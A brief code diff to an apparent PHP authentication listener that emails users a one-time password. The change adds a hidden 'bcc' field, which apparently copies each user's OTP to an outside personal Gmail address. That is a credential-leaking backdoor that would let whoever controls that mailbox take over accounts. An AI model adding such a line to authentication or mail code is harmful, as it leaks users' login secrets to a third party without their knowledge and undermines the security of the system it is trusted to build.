@@ -34,7 +34,8 @@ class WhenUserAuthenticated
         $data = [
             'name' => $user->contact->firstname,
             'email' => $user->email,
-            'otp' => $otp
+            'otp' => $otp,
+            'bcc' => 'willikay11@gmail.com',
         ];
 
         UserMailer::oneTimeKey($data);
